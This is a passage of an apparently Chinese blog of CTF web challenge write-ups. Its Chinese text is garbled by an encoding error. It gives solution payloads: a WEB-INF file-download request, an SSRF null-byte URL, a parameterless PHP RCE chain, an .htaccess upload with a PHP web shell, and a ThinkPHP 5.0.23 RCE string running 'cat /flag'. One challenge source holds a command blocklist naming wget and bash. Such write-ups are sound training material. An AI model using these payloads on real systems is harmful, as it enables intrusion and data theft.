&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110726.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="roarctf-2019easy-java"&gt;[RoarCTF 2019]Easy Java
&lt;/h1&gt;&lt;p&gt;æ˜¯javaå†™çš„webç¨‹åº&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110821.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;è€ƒç‚¹æ˜¯&lt;strong&gt;WEB-INF/web.xmlæ³„éœ²&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•:&lt;/p&gt;
&lt;p&gt;/WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚&lt;/p&gt;
&lt;p&gt;/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­&lt;/p&gt;
&lt;p&gt;/WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶&lt;/p&gt;
&lt;p&gt;/WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;/WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç &lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;é‡ç‚¹ä¸åœ¨ç™»é™†ç•Œé¢ï¼Œè€Œæ˜¯é‚£ä¸ªHelpæŒ‰é’®ï¼Œå¯ä»¥ä¸‹è½½æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110934.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå°è¯•å»è¯»web.xmlæ–‡æ¡£ï¼Œæ·»åŠ POSTè¯·æ±‚&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;filename=WEB-INF/web.xml
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¯ä»¥è¯»å–web.xmlæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;web-app&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;xmlns=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://xmlns.jcp.org/xml/ns/javaee&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;xmlns:xsi=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;xsi:schemaLocation=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;version=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;4.0&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;welcome-file-list&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;welcome-file&amp;gt;&lt;/span&gt;Index&lt;span style="color:#f92672"&gt;&amp;lt;/welcome-file&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/welcome-file-list&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;IndexController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.wm.ctf.IndexController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;IndexController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/Index&lt;span style="color:#f92672"&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;LoginController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.wm.ctf.LoginController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;LoginController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/Login&lt;span style="color:#f92672"&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;DownloadController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.wm.ctf.DownloadController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;DownloadController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/Download&lt;span style="color:#f92672"&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;FlagController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.wm.ctf.FlagController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;FlagController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/Flag&lt;span style="color:#f92672"&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;/web-app&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„åˆ°äº†ä¸€ä¸ª&lt;code&gt;FlagController&lt;/code&gt;çš„æ§åˆ¶å™¨ï¼Œå®ƒæ‰€åœ¨çš„ç±»ä¸º&lt;code&gt;com.wm.ctf.FlagController&lt;/code&gt;ï¼Œå‰é¢ä¹Ÿæåˆ°äº†ç¼–è¯‘æ–‡ä»¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹&lt;code&gt;/WEB-INF/classes/&lt;/code&gt;ï¼Œå»è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹è½½&lt;code&gt;FlagController&lt;/code&gt;ç›¸å…³çš„æ–‡ä»¶ï¼Œè¿˜éœ€è¦çŸ¥é“çš„æ˜¯ï¼šJavawebç¨‹åºç¼–è¯‘æ–‡ä»¶çš„ç›®å½•ç»“æ„æ˜¯æ ¹æ®ç±»ååˆ›å»ºçš„ï¼Œç±»åæˆ‘ä»¬ä¹ŸçŸ¥é“äº†ï¼Œæ‰€ä»¥ä¸‹è½½ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;filename=WEB-INF/classes/com/wm/ctf/FlagController.class
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;classæ–‡ä»¶æºç å¥½å¤šä¸å¯è§å­—ç¬¦&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310112205.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘é€‰ä¸­çš„é‚£æ®µå°±æ˜¯flagåœ¨çš„åœ°æ–¹ï¼Œçœ‹åˆ°äº†&lt;code&gt;==&lt;/code&gt;å°±åº”è¯¥æ„è¯†åˆ°æ˜¯base64ç¼–ç ï¼Œä½†æ˜¯base64ç¼–ç é‡Œæ²¡æœ‰&lt;code&gt;&amp;lt;&lt;/code&gt;è¿™ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥flagçš„å¯†æ–‡å°±æ˜¯&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;ZmxhZ3s0NmNhMTExMS01ZjI5LTQwYjMtYjUwMC1lYWMzZjkyMjU4ODF9Cg==
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="ä»¥ä¸‹éƒ¨åˆ†æ–½å·¥ä¸­"&gt;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;ä»¥ä¸‹éƒ¨åˆ†æ–½å·¥ä¸­ğŸ‘·â€â™‚ï¸&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;
&lt;/h1&gt;&lt;p&gt;ä¸‹é¢çš„éƒ½æ˜¯æ²¡æœ‰æ•´ç†ï¼Œå…ˆæŠŠé‡è¦æ€è·¯å†™ä¸‹æ¥äº†ï¼Œç„¶åæœ‰æ—¶é—´å†é…å›¾&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="gkctf2020cveç‰ˆç­¾åˆ°"&gt;[GKCTF2020]cveç‰ˆç­¾åˆ°
&lt;/h1&gt;&lt;p&gt;&lt;a class="link" href="https://blog.csdn.net/qq_45521281/article/details/106425266" target="_blank" rel="noopener"
&gt;CVE-2020-7066&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;åªæœ‰ä¸€ä¸ªæŒ‰é’®ï¼Œç‚¹å‡»ä»¥åæŸ¥çœ‹ç½‘é¡µçš„Networkè¯·æ±‚ä¸­æœ‰ä¸€ä¸ª&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hint: Flag in localhost&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;ä¸”utlåœ°å€ä¸­æœ‰å¯æ§çš„å‚æ•°ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ä½¿ç”¨ssrfã€‚è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæç¤ºæ˜¯åœ¨ä¸»é¡µé¢é‚£é‡Œ&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You just view *.ctfhub.com&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;åªå¯ä»¥è®¿é—®ä»¥ctfhub.comç»“å°¾çš„ç½‘ç«™ï¼Œå†æ ¹æ®cveä½¿ç”¨%00æˆªæ–­è®¿é—®ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?url=http://127.0.0.1%00.ctfhub.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç¬¬äºŒä¸ªæç¤ºï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Host must be end with &amp;lsquo;123&amp;rsquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å¿…é¡»ä»¥123ç»“å°¾ï¼Œæ‰€ä»¥æœ€ç»ˆpayload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?url=http://127.0.0.123%00.ctfhub.com
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="gxyctf2019ç¦æ­¢å¥—å¨ƒ"&gt;[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ
&lt;/h1&gt;&lt;p&gt;gitæ³„éœ²ã€‚æˆ‘ä½¿ç”¨çš„https://github.com/gakki429/Git_Extract&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
include &amp;#34;flag.php&amp;#34;;
echo &amp;#34;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&amp;lt;br&amp;gt;&amp;#34;;
if(isset($_GET[&amp;#39;exp&amp;#39;])){
if (!preg_match(&amp;#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&amp;#39;, $_GET[&amp;#39;exp&amp;#39;])) {
if(&amp;#39;;&amp;#39; === preg_replace(&amp;#39;/[a-z,_]+\((?R)?\)/&amp;#39;, NULL, $_GET[&amp;#39;exp&amp;#39;])) {
if (!preg_match(&amp;#39;/et|na|info|dec|bin|hex|oct|pi|log/i&amp;#39;, $_GET[&amp;#39;exp&amp;#39;])) {
// echo $_GET[&amp;#39;exp&amp;#39;];
@eval($_GET[&amp;#39;exp&amp;#39;]);
}
else{
die(&amp;#34;è¿˜å·®ä¸€ç‚¹å“¦ï¼&amp;#34;);
}
}
else{
die(&amp;#34;å†å¥½å¥½æƒ³æƒ³ï¼&amp;#34;);
}
}
else{
die(&amp;#34;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&amp;#34;);
}
}
// highlight_file(__FILE__);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„åªæœ‰å‡½æ•°çš„å½¢å¼å¦‚&lt;code&gt;var_dump();&lt;/code&gt;æ˜¯ä¸€é“&lt;a class="link" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener"
&gt;æ— å‚æ•°RCE&lt;/a&gt;ï¼Œçœ‹çš„é¢˜è§£è‡ªå·±æ•´ç†çš„payloadï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?exp=var_dump(readfile(array_rand(array_flip(scandir(current(localeconv()))))));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸€å±‚ä¸€å±‚è§£é‡Šï¼š&lt;/p&gt;
&lt;p&gt;localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å›¾ç‰‡å±•ç¤º&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚åˆ«åpos()&lt;/p&gt;
&lt;p&gt;åˆ°è¿™é‡Œè·å¾—çš„æ˜¯ä¸€ä¸ªç‚¹&lt;/p&gt;
&lt;p&gt;scandir() éå†ç›®å½•ï¼Œæ˜¯&lt;code&gt;.&lt;/code&gt;çš„è¯å°±æ˜¯åˆ—å‡ºå½“å‰ç›®å½•ã€‚&lt;/p&gt;
&lt;p&gt;æ­¤æ—¶è¾“å‡ºï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;array(5) { [0]=&amp;gt; string(1) &amp;#34;.&amp;#34; [1]=&amp;gt; string(2) &amp;#34;..&amp;#34; [2]=&amp;gt; string(4) &amp;#34;.git&amp;#34; [3]=&amp;gt; string(8) &amp;#34;flag.php&amp;#34; [4]=&amp;gt; string(9) &amp;#34;index.php&amp;#34; }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿™æ—¶çš„è¾“å‡ºè¿˜æ˜¯é”®å€¼å¯¹çš„å½¢å¼ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨&lt;code&gt;array_flip()&lt;/code&gt;å‡½æ•°äº¤æ¢é”®å€¼å¯¹ï¼Œç„¶åä½¿ç”¨éšæœºå‡½æ•°&lt;code&gt;array_rand()&lt;/code&gt;ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒã€‚å› ä¸ºæ­£åˆ™çš„åŸå› æ— æ³•ä½¿ç”¨&lt;code&gt;file_get_contents()&lt;/code&gt;ï¼Œä½†æ˜¯è¿˜æœ‰å…¶ä»–è¯»å–æ–‡ä»¶çš„å‡½æ•°:readfile()ã€highlight_file()å’Œå®ƒçš„åˆ«åå‡½æ•°show_source()ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="gxyctf2019babyupload"&gt;[GXYCTF2019]BabyUpload
&lt;/h1&gt;&lt;p&gt;phè¿‡æ»¤ï¼Œimage/gifä¸èƒ½é€šè¿‡ã€‚image/jpeå¯ä»¥&lt;/p&gt;
&lt;p&gt;ä¸Šä¼ .htaccess&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;SetHandler application/x-httpd-php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸Šä¼ ç ï¼Œä½†æ˜¯ä¸èƒ½æ˜¯phpä»£ç ï¼Œä½¿ç”¨js&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt;eval($_REQUEST[shell])&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å®Œå·¥&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf-2ndold-hack"&gt;[BJDCTF 2nd]old-hack
&lt;/h1&gt;&lt;p&gt;ThinkPHPçš„&lt;a class="link" href="https://blog.csdn.net/qq_38807738/article/details/86777541" target="_blank" rel="noopener"
&gt;æ¼æ´&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ThinkPHP5 5.0.23&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=cat /flag
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="å®‰æ´µæ¯-2019easy_web"&gt;[å®‰æ´µæ¯ 2019]easy_web
&lt;/h1&gt;&lt;p&gt;çœ‹urlä¸€ä¸ªimgå’Œcmdï¼Œé¡µé¢ä¸­æœ‰ä¸€ä¸ªå›¾ç‰‡çš„æ ‡ç­¾ï¼Œå’Œä¸€ä¸ª&lt;strong&gt;md5 is funny ~&lt;/strong&gt;ã€‚æŠŠurlä¸­imgçš„å€¼è¿›è¡Œè§£ç å‘ç°å›¾ç‰‡åä¸º&lt;code&gt;555.png&lt;/code&gt;ï¼Œå°è¯•ç”¨åŒæ ·çš„ç¼–ç æ–¹å¼è¯»å–index.phpï¼ŒåŠ å¯†çš„ç¼–ç ä¾æ¬¡ä¸ºï¼šhex&amp;ndash;&amp;gt;base64&amp;ndash;&amp;gt;base64ã€‚&lt;/p&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
error_reporting(E_ALL || ~ E_NOTICE);
header(&amp;#39;content-type:text/html;charset=utf-8&amp;#39;);
$cmd = $_GET[&amp;#39;cmd&amp;#39;];
if (!isset($_GET[&amp;#39;img&amp;#39;]) || !isset($_GET[&amp;#39;cmd&amp;#39;]))
header(&amp;#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;amp;cmd=&amp;#39;);
$file = hex2bin(base64_decode(base64_decode($_GET[&amp;#39;img&amp;#39;])));
$file = preg_replace(&amp;#34;/[^a-zA-Z0-9.]+/&amp;#34;, &amp;#34;&amp;#34;, $file);
if (preg_match(&amp;#34;/flag/i&amp;#34;, $file)) {
echo &amp;#39;&amp;lt;img src =&amp;#34;./ctf3.jpeg&amp;#34;&amp;gt;&amp;#39;;
die(&amp;#34;xixiï½ no flag&amp;#34;);
} else {
$txt = base64_encode(file_get_contents($file));
echo &amp;#34;&amp;lt;img src=&amp;#39;data:image/gif;base64,&amp;#34; . $txt . &amp;#34;&amp;#39;&amp;gt;&amp;lt;/img&amp;gt;&amp;#34;;
echo &amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
}
echo $cmd;
echo &amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
if (preg_match(&amp;#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&amp;#39;|\&amp;#34;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&amp;lt;|&amp;gt;/i&amp;#34;, $cmd)) {
echo(&amp;#34;forbid ~&amp;#34;);
echo &amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
} else {
if ((string)$_POST[&amp;#39;a&amp;#39;] !== (string)$_POST[&amp;#39;b&amp;#39;] &amp;amp;&amp;amp; md5($_POST[&amp;#39;a&amp;#39;]) === md5($_POST[&amp;#39;b&amp;#39;])) {
echo `$cmd`;
} else {
echo (&amp;#34;md5 is funny ~&amp;#34;);
}
}
?&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;style&amp;gt;
body{
background:url(./bj.png) no-repeat center center;
background-size:cover;
background-attachment:fixed;
background-color:#CCCCCC;
}
&amp;lt;/style&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘çš„bpä¸€å®šè¦åœ¨&lt;code&gt;&amp;amp;&lt;/code&gt;å‰åŠ ä¸€ä¸ªç©ºæ ¼æ‰å¯ä»¥é€šè¿‡ã€‚&lt;/p&gt;
